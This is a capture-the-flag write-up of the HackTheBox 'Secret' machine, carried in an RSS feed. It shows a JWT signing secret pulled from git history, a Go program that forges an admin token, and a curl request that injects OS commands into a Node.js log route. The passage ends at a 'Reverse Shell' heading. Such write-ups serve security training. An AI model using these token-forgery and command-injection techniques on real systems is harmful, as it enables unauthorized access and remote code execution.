<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>SUID on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/suid/</link>
    <description>Recent content in SUID on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 28 Sep 2022 00:17:45 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/suid/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Secret</title>
      <link>https://fahmifj.github.io/hackthebox/secret/</link>
      <pubDate>Wed, 28 Sep 2022 00:17:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/secret/</guid>
      <description>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&amp;rsquo;s a custom program with SUID bit that can be exploited by crashing it.
Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.</description>
      <content:encoded><![CDATA[<p>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Forging JWT</li>
<li>Command injection in API</li>
<li>Abuse Core Dump with SUID</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>nmap</li>
<li>JWT tool</li>
<li>curl</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP port scan with <code>nmap</code> discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.js.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.120 secret
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.120 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,3000 -sC -sV -oA nmap/all-tcp-ports-secret 10.10.11.120
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-30 23:20 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.120
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.04 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the web on port 80 shows an online API documentation page called &ldquo;DUMBDocs&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20220926161011625.png" alt="image-20220926161011625"  /></div>
</p>
<p>The Live Demo button points to <code>/api/</code>, but it&rsquo;s a 404.</p>
<p><div class="img-container"><img src="imgs/image-20211031105210501.png" alt="image-20211031105210501"  /></div>
</p>
<p>At the bottom of the page, there&rsquo;s a button to download the API source code and I&rsquo;ll grab it.</p>
<p><div class="img-container"><img src="imgs/image-20211031104419915.png" alt="image-20211031104419915"  /></div>
</p>
<p>Clicking on any of the available card menus (introduction, installation, etc.) redirects to <code>/docs</code>, which in this section it explains how to use the API.</p>
<p><div class="img-container"><img src="imgs/image-20211031110930866.png" alt="image-20211031110930866"  /></div>
</p>
<p>Some sections contain <em>lorem ipsum</em> text, some are not. That should be the hint where to go further</p>
<h3 id="tcp-3000---website">TCP 3000 - Website</h3>
<p>On port 3000, it serves the same site as on port 80, but it served by <code>node.js</code> not <code>NGINX</code>.</p>
<p><div class="img-container"><img src="imgs/image-20211031110717336.png" alt="image-20211031110717336"  /></div>
</p>
<p>From here, I&rsquo;ll look into the API.</p>
<h3 id="api">API</h3>
<h4 id="register">Register</h4>
<p>According to the documentation (<code>/docs</code>), I can register a user by sending API request to <code>/api/user/register</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;name&#34;: &#34;syncrst&#34;,&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/register
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;syncrst&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>The response returns my username and that means the registration was successful.</p>
<h4 id="login---jwt-token">Login -&gt; JWT token</h4>
<p>Now that I&rsquo;ve been registered, I can login to get a <a href="https://jwt.io/introduction">JWT token</a> by sending API request to <code>/api/user/login</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/login 
</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc
</span></span></code></pre></div><p>The payload data of this JWT can be seen with <a href="https://jwt.io">jwt.io</a>.</p>
<p><div class="img-container"><img src="imgs/image-20220927133742256.png" alt="image-20220927133742256"  /></div>
</p>
<h4 id="private-route">Private Route</h4>
<p>The last API route in this docs is <code>/api/priv</code>. I can use the auth token I got on this route, where it basically just checks for user role or privilege.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ curl -sH <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc&#39;</span> http://secret.htb:3000/api/priv <span class="p">|</span> jq
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;role&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;you are normal user&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;syncrst&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>It&rsquo;s still vague what to do with this API, so I&rsquo;ll look into the source code.</p>
<h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="directory-structure">Directory Structure</h4>
<p>The source code has the typical structure of <code>node.js</code> application</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.28» 
</span></span><span class="line"><span class="cl">$ tree -L <span class="m">2</span> . 
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── files.zip
</span></span><span class="line"><span class="cl">└── local-web
</span></span><span class="line"><span class="cl">    ├── index.js
</span></span><span class="line"><span class="cl">    ├── model
</span></span><span class="line"><span class="cl">    ├── node_modules
</span></span><span class="line"><span class="cl">    ├── package.json
</span></span><span class="line"><span class="cl">    ├── package-lock.json
</span></span><span class="line"><span class="cl">    ├── public
</span></span><span class="line"><span class="cl">    ├── routes
</span></span><span class="line"><span class="cl">    ├── src
</span></span><span class="line"><span class="cl">    └── validations.js
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">7</span> directories, <span class="m">5</span> files
</span></span></code></pre></div><h4 id="commit-history">Commit History</h4>
<p>When I enter the <code>local-web</code> directory, my git plugin is activated, which indicates it contains git objects. It&rsquo;s worth to start with git first.</p>
<p>Running <code>git log</code> shows the commit history, author and email address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ git log 
</span></span><span class="line"><span class="cl">commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Thu Sep <span class="m">9</span> 00:03:27 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    now we can view logs from server 😃
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:30:17 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    removed .env <span class="k">for</span> security reasons
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit de0a46b5107a2f4d26e348303e76d85ae4870934
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:29:19 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    added /downloads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:27:35 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    removed swap
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 3a367e735ee76569664bf7754eaaade7c735d702
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:26:39 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    added downloads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:25:52 <span class="m">2021</span> +0530
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    first commit
</span></span></code></pre></div><p>Commit <code>67d8da7</code> seems interesting. When comparing it with commit <code>de0a46b</code>, there&rsquo;s a deleted secret token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ git diff 67d8da7 de0a46b <span class="p">|</span> cat
</span></span><span class="line"><span class="cl">diff --git a/.env b/.env
</span></span><span class="line"><span class="cl">index 31db370..fb6f587 <span class="m">100644</span>
</span></span><span class="line"><span class="cl">--- a/.env
</span></span><span class="line"><span class="cl">+++ b/.env
</span></span><span class="line"><span class="cl">@@ -1,2 +1,2 @@
</span></span><span class="line"><span class="cl"> <span class="nv">DB_CONNECT</span> <span class="o">=</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
</span></span><span class="line"><span class="cl">-TOKEN_SECRET <span class="o">=</span> secret
</span></span><span class="line"><span class="cl">+TOKEN_SECRET <span class="o">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</span></span></code></pre></div><p>I&rsquo;ll note that secret token.</p>
<h4 id="web-routes">Web Routes</h4>
<p>Looking at the <code>index.js</code> file, there are three defined routes: <code>privRoute</code>, <code>authRoute</code>, and <code>webroute</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">const <span class="nv">privRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/private&#39;</span><span class="o">)</span> <span class="c1"># location: routes/private.js</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">// import routs 
</span></span><span class="line"><span class="cl">const <span class="nv">authRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/auth&#39;</span><span class="o">)</span><span class="p">;</span> <span class="c1"># location: routes/auth.js</span>
</span></span><span class="line"><span class="cl">const <span class="nv">webroute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./src/routes/web&#39;</span><span class="o">)</span> <span class="c1"># location: src/routes/web.js</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">//middle ware 
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span>express.json<span class="o">())</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/user&#39;</span>,authRoute<span class="o">)</span>
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/&#39;</span>, privRoute<span class="o">)</span>
</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/&#39;</span>, webroute<span class="o">)</span>
</span></span></code></pre></div><p><code>webroute</code> is the router that handles the documentation web while <code>authRoute</code> is the router that handles the API  for user registration (<code>/api/user/register</code>) and login (<code>/api/user/login</code>) .</p>
<p>As for <code>privRoute</code>, it handles the API for private route (<code>/api/priv</code>). But, there&rsquo;s a hidden route <code>/api/logs</code> that wasn&rsquo;t listed in the API documentation. What&rsquo;s more interesting is that <code>/api/logs</code> route is vulnerable to command injection only if I pass the verification as user <code>theadmin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span> <span class="err">#</span> <span class="nx">command</span> <span class="nx">injection</span>
</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">role</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">role</span><span class="o">:</span> <span class="s2">&#34;you are normal user&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">desc</span><span class="o">:</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-dasith">Shell as dasith</h3>
<h4 id="forging-admin-token">Forging Admin Token</h4>
<p>With the secret token obtained, I&rsquo;ll write a program to forge valid JWT token for user <code>theadmin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span> <span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">claims</span> <span class="o">:=</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ID</span>    <span class="kt">string</span> <span class="s">`json:&#34;_id,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Name</span>  <span class="kt">string</span> <span class="s">`json:&#34;name,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Email</span> <span class="kt">string</span> <span class="s">`json:&#34;email,omitempty&#34;`</span>
</span></span><span class="line"><span class="cl">		<span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span>
</span></span><span class="line"><span class="cl">	<span class="p">}{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ID</span><span class="p">:</span>    <span class="s">&#34;6114654d77f9a54e00f05777&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;theadmin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Email</span><span class="p">:</span> <span class="s">&#34;root@dasith.works&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">secret</span> <span class="o">:=</span> <span class="s">&#34;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">signedToken</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">signedToken</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I&rsquo;ll run the program to get the auth token.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ go run forge-jwt.go
</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.TKKattF_Exm2kXW4PQOo9jyrW0cMYuQkiQWP7DuhPn0
</span></span></code></pre></div><p>Now I can verify if that token works by accessing the <code>/api/priv</code> route</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$  curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/priv&#34;</span> <span class="p">|</span> jq
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;creds&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;admin&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span>: <span class="s2">&#34;theadmin&#34;</span>,
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;welcome back admin,&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="command-injection">Command Injection</h4>
<p>With admin token, I can access the <code>/api/logs</code> route.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl">       <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
</span></span></code></pre></div><p>This route takes one query: <code>file</code>, where its value then get passed into <code>getLogs</code> and eventually executed as OS command in the <code>exec()</code> function. Knowing this, I can inject OS command in the <code>file</code> query with <code>|</code> (pipe):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|uname%20-a&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n&#34;</span>
</span></span></code></pre></div><p>And that worked.</p>
<blockquote>
<p>the <code>&gt;</code> and <code>/</code> symbols are URL encoded.</p>
</blockquote>
<h4 id="reverse-shell">Reverse Shell</h4>
